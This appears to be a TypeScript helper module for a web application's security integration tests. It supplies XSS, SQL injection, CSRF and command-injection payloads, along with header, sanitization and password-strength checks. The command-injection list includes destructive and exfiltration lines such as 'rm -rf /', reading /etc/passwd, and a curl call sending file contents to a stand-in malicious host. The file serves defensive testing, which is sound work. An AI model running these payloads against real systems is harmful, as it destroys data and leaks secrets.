/* eslint-disable @typescript-eslint/no-unused-vars, @typescript-eslint/no-explicit-any */
import { testDb } from '../../integration/setup';
import { users, sessions } from '$lib/server/db/schema';
import { eq } from 'drizzle-orm';
import bcrypt from 'bcryptjs';
import crypto from 'crypto';

/**
 * Security Test Helpers
 *
 * Utilities for security testing including:
 * - Attack simulation
 * - Vulnerability scanning
 * - Security validation
 * - Exploit detection
 */

export interface SecurityTestUser {
	id: string;
	username: string;
	password: string;
	hashedPassword: string;
	role: 'admin' | 'user';
}

export interface AttackPayload {
	type: 'xss' | 'sql_injection' | 'csrf' | 'command_injection';
	payload: string;
	expected: 'blocked' | 'sanitized' | 'error';
	description: string;
}

export interface SecurityTestScenario {
	name: string;
	description: string;
	attacks: AttackPayload[];
	setup?: () => Promise<void>;
	cleanup?: () => Promise<void>;
}

export class SecurityTestHelpers {
	/**
	 * Create test users with different security profiles
	 */
	static async createSecurityTestUsers(): Promise<{
		admin: SecurityTestUser;
		regularUser: SecurityTestUser;
		weakPasswordUser: SecurityTestUser;
	}> {
		const timestamp = Date.now();

		const admin: SecurityTestUser = {
			id: crypto.randomUUID(),
			username: `security_admin_${timestamp}`,
			password: 'SecureAdmin123!@#',
			hashedPassword: await bcrypt.hash('SecureAdmin123!@#', 10),
			role: 'admin'
		};

		const regularUser: SecurityTestUser = {
			id: crypto.randomUUID(),
			username: `security_user_${timestamp}`,
			password: 'SecureUser456$%^',
			hashedPassword: await bcrypt.hash('SecureUser456$%^', 10),
			role: 'user'
		};

		const weakPasswordUser: SecurityTestUser = {
			id: crypto.randomUUID(),
			username: `weak_user_${timestamp}`,
			password: '123',
			hashedPassword: await bcrypt.hash('123', 10),
			role: 'user'
		};

		// Insert users into database
		await testDb.insert(users).values([
			{
				id: admin.id,
				username: admin.username,
				hashedPassword: admin.hashedPassword,
				createdAt: new Date(),
				updatedAt: new Date()
			},
			{
				id: regularUser.id,
				username: regularUser.username,
				hashedPassword: regularUser.hashedPassword,
				createdAt: new Date(),
				updatedAt: new Date()
			},
			{
				id: weakPasswordUser.id,
				username: weakPasswordUser.username,
				hashedPassword: weakPasswordUser.hashedPassword,
				createdAt: new Date(),
				updatedAt: new Date()
			}
		]);

		return { admin, regularUser, weakPasswordUser };
	}

	/**
	 * Generate XSS attack payloads
	 */
	static getXSSPayloads(): AttackPayload[] {
		return [
			{
				type: 'xss',
				payload: '<script>alert("XSS")</script>',
				expected: 'blocked',
				description: 'Basic script tag injection'
			},
			{
				type: 'xss',
				payload: '"><script>alert("XSS")</script>',
				expected: 'blocked',
				description: 'Script injection with quote escape'
			},
			{
				type: 'xss',
				payload: 'javascript:alert("XSS")',
				expected: 'blocked',
				description: 'JavaScript protocol injection'
			},
			{
				type: 'xss',
				payload: '<img src="x" onerror="alert(\'XSS\')">',
				expected: 'blocked',
				description: 'Event handler injection'
			},
			{
				type: 'xss',
				payload: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
				expected: 'blocked',
				description: 'Iframe with JavaScript source'
			},
			{
				type: 'xss',
				payload: '<svg onload="alert(\'XSS\')">',
				expected: 'blocked',
				description: 'SVG with event handler'
			},
			{
				type: 'xss',
				payload: '<input type="text" value="" onfocus="alert(\'XSS\')" autofocus>',
				expected: 'blocked',
				description: 'Input with autofocus and event handler'
			}
		];
	}

	/**
	 * Generate SQL injection attack payloads
	 */
	static getSQLInjectionPayloads(): AttackPayload[] {
		return [
			{
				type: 'sql_injection',
				payload: "'; DROP TABLE users; --",
				expected: 'blocked',
				description: 'Classic table drop injection'
			},
			{
				type: 'sql_injection',
				payload: "' OR '1'='1",
				expected: 'blocked',
				description: 'Boolean-based blind SQL injection'
			},
			{
				type: 'sql_injection',
				payload: "' UNION SELECT * FROM users --",
				expected: 'blocked',
				description: 'Union-based SQL injection'
			},
			{
				type: 'sql_injection',
				payload: "'; INSERT INTO users (username, password) VALUES ('hacker', 'pass'); --",
				expected: 'blocked',
				description: 'Data manipulation injection'
			},
			{
				type: 'sql_injection',
				payload: "'; UPDATE users SET password = 'hacked' WHERE id = 1; --",
				expected: 'blocked',
				description: 'Update-based injection'
			},
			{
				type: 'sql_injection',
				payload: "1; EXEC xp_cmdshell('dir'); --",
				expected: 'blocked',
				description: 'Command execution injection'
			}
		];
	}

	/**
	 * Generate CSRF attack scenarios
	 */
	static getCSRFPayloads(): AttackPayload[] {
		return [
			{
				type: 'csrf',
				payload: JSON.stringify({
					title: 'Malicious Post',
					content: 'This post was created via CSRF attack'
				}),
				expected: 'blocked',
				description: 'POST request without CSRF token'
			},
			{
				type: 'csrf',
				payload: JSON.stringify({
					username: 'hacker',
					password: 'newpassword'
				}),
				expected: 'blocked',
				description: 'Password change without CSRF token'
			},
			{
				type: 'csrf',
				payload: JSON.stringify({
					action: 'delete',
					target: 'all_posts'
				}),
				expected: 'blocked',
				description: 'Destructive action without CSRF token'
			}
		];
	}

	/**
	 * Generate command injection payloads
	 */
	static getCommandInjectionPayloads(): AttackPayload[] {
		return [
			{
				type: 'command_injection',
				payload: '; rm -rf /',
				expected: 'blocked',
				description: 'File system destruction command'
			},
			{
				type: 'command_injection',
				payload: '| cat /etc/passwd',
				expected: 'blocked',
				description: 'System file access via pipe'
			},
			{
				type: 'command_injection',
				payload: '$(whoami)',
				expected: 'blocked',
				description: 'Command substitution injection'
			},
			{
				type: 'command_injection',
				payload: '`id`',
				expected: 'blocked',
				description: 'Backtick command execution'
			},
			{
				type: 'command_injection',
				payload: '&& curl http://malicious-site.com/steal?data=$(cat /etc/hosts)',
				expected: 'blocked',
				description: 'Data exfiltration command'
			}
		];
	}

	/**
	 * Validate security headers
	 */
	static validateSecurityHeaders(headers: Headers): {
		passed: boolean;
		results: Array<{ header: string; status: 'pass' | 'fail' | 'warning'; message: string }>;
	} {
		const results: Array<{
			header: string;
			status: 'pass' | 'fail' | 'warning';
			message: string;
		}> = [];
		let allPassed = true;

		// Required security headers
		const requiredHeaders = [
			{
				name: 'X-Frame-Options',
				expected: ['DENY', 'SAMEORIGIN'],
				critical: true
			},
			{
				name: 'X-Content-Type-Options',
				expected: ['nosniff'],
				critical: true
			},
			{
				name: 'X-XSS-Protection',
				expected: ['1; mode=block', '0'],
				critical: false
			},
			{
				name: 'Content-Security-Policy',
				expected: null, // Will validate existence and basic structure
				critical: true
			},
			{
				name: 'Referrer-Policy',
				expected: ['strict-origin-when-cross-origin', 'strict-origin', 'no-referrer'],
				critical: false
			}
		];

		for (const header of requiredHeaders) {
			const value = headers.get(header.name);

			if (!value) {
				results.push({
					header: header.name,
					status: header.critical ? 'fail' : 'warning',
					message: `Missing ${header.name} header`
				});
				if (header.critical) allPassed = false;
				continue;
			}

			if (header.expected && !header.expected.includes(value)) {
				results.push({
					header: header.name,
					status: 'fail',
					message: `Invalid ${header.name} value: ${value}`
				});
				allPassed = false;
			} else {
				results.push({
					header: header.name,
					status: 'pass',
					message: `${header.name} is properly configured`
				});
			}
		}

		// Special validation for CSP
		const csp = headers.get('Content-Security-Policy');
		if (csp) {
			const hasDefaultSrc = csp.includes('default-src');
			const hasScriptSrc = csp.includes('script-src');
			const hasStyleSrc = csp.includes('style-src');

			if (!hasDefaultSrc) {
				results.push({
					header: 'Content-Security-Policy',
					status: 'fail',
					message: 'CSP missing default-src directive'
				});
				allPassed = false;
			}

			if (!hasScriptSrc) {
				results.push({
					header: 'Content-Security-Policy',
					status: 'warning',
					message: 'CSP missing script-src directive'
				});
			}
		}

		return { passed: allPassed, results };
	}

	/**
	 * Simulate password brute force attack
	 */
	static async simulateBruteForceAttack(
		username: string,
		maxAttempts: number = 10
	): Promise<{
		successful: boolean;
		attempts: number;
		lockedOut: boolean;
		responseTime: number;
	}> {
		const commonPasswords = [
			'password',
			'123456',
			'admin',
			'root',
			'qwerty',
			'letmein',
			'welcome',
			'monkey',
			'dragon',
			'pass'
		];

		let attempts = 0;
		let lockedOut = false;
		const startTime = Date.now();

		for (const password of commonPasswords) {
			if (attempts >= maxAttempts) {
				lockedOut = true;
				break;
			}

			attempts++;

			// Simulate login attempt (this would call actual auth endpoint in real test)
			try {
				const isValidPassword = await bcrypt.compare(password, '$2a$10$fake.hash.here');
				if (isValidPassword) {
					return {
						successful: true,
						attempts,
						lockedOut: false,
						responseTime: Date.now() - startTime
					};
				}
			} catch (error) {
				// Authentication error indicates potential lockout mechanism
				if (
					(error as Error).message.includes('locked') ||
					(error as Error).message.includes('rate limit')
				) {
					lockedOut = true;
					break;
				}
			}

			// Simulate delay between attempts (realistic attack pattern)
			await new Promise((resolve) => setTimeout(resolve, 100));
		}

		return {
			successful: false,
			attempts,
			lockedOut,
			responseTime: Date.now() - startTime
		};
	}

	/**
	 * Test input sanitization
	 */
	static testInputSanitization(
		input: string,
		sanitizedOutput: string
	): {
		isSanitized: boolean;
		risks: string[];
		recommendation: string;
	} {
		const risks: string[] = [];
		let isSanitized = true;

		// Check for script tags
		if (/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi.test(sanitizedOutput)) {
			risks.push('Script tags present in output');
			isSanitized = false;
		}

		// Check for event handlers
		if (/on\w+\s*=/gi.test(sanitizedOutput)) {
			risks.push('Event handlers present in output');
			isSanitized = false;
		}

		// Check for javascript: protocol
		if (/javascript\s*:/gi.test(sanitizedOutput)) {
			risks.push('JavaScript protocol present in output');
			isSanitized = false;
		}

		// Check for iframe tags
		if (/<iframe\b/gi.test(sanitizedOutput)) {
			risks.push('Iframe tags present in output');
			isSanitized = false;
		}

		// Check for SQL injection patterns
		if (/('|(\\'))|(;)|(\\)|(\/\*)|(--)|(\{)|(\})/gi.test(sanitizedOutput)) {
			risks.push('Potential SQL injection patterns in output');
			isSanitized = false;
		}

		let recommendation = 'Input is properly sanitized';
		if (!isSanitized) {
			recommendation =
				'Input requires additional sanitization. Consider using HTML sanitization libraries and prepared statements.';
		}

		return {
			isSanitized,
			risks,
			recommendation
		};
	}

	/**
	 * Generate secure session token
	 */
	static generateSecureSessionToken(): string {
		return crypto.randomBytes(32).toString('hex');
	}

	/**
	 * Validate password strength
	 */
	static validatePasswordStrength(password: string): {
		score: number;
		strength: 'very-weak' | 'weak' | 'fair' | 'good' | 'strong';
		feedback: string[];
	} {
		const feedback: string[] = [];
		let score = 0;

		// Length check
		if (password.length >= 8) score += 1;
		else feedback.push('Password should be at least 8 characters long');

		if (password.length >= 12) score += 1;

		// Character variety
		if (/[a-z]/.test(password)) score += 1;
		else feedback.push('Password should contain lowercase letters');

		if (/[A-Z]/.test(password)) score += 1;
		else feedback.push('Password should contain uppercase letters');

		if (/[0-9]/.test(password)) score += 1;
		else feedback.push('Password should contain numbers');

		if (/[^a-zA-Z0-9]/.test(password)) score += 1;
		else feedback.push('Password should contain special characters');

		// Common password check
		const commonPasswords = [
			'password',
			'123456',
			'qwerty',
			'admin',
			'letmein',
			'welcome',
			'monkey',
			'dragon',
			'pass',
			'test'
		];
		const isCommonPassword = commonPasswords.includes(password.toLowerCase());
		if (isCommonPassword) {
			score = 0; // Force to very weak
			feedback.push('Password is too common');
		}

		// Determine strength
		let strength: 'very-weak' | 'weak' | 'fair' | 'good' | 'strong';
		if (score <= 1) strength = 'very-weak';
		else if (score <= 2) strength = 'weak';
		else if (score <= 3) strength = 'fair';
		else if (score <= 4) strength = 'good';
		else strength = 'strong';

		return { score, strength, feedback };
	}

	/**
	 * Create security test scenarios
	 */
	static createSecurityScenarios(): SecurityTestScenario[] {
		return [
			{
				name: 'XSS Prevention',
				description: 'Test cross-site scripting prevention mechanisms',
				attacks: this.getXSSPayloads()
			},
			{
				name: 'SQL Injection Prevention',
				description: 'Test SQL injection prevention mechanisms',
				attacks: this.getSQLInjectionPayloads()
			},
			{
				name: 'CSRF Protection',
				description: 'Test cross-site request forgery protection',
				attacks: this.getCSRFPayloads()
			},
			{
				name: 'Command Injection Prevention',
				description: 'Test command injection prevention mechanisms',
				attacks: this.getCommandInjectionPayloads()
			}
		];
	}

	/**
	 * Cleanup security test data
	 */
	static async cleanupSecurityTestData(): Promise<void> {
		// Remove test users created for security testing
		await testDb.delete(users).where(eq(users.username, 'security_admin_test'));
		await testDb.delete(users).where(eq(users.username, 'security_user_test'));
	}
}
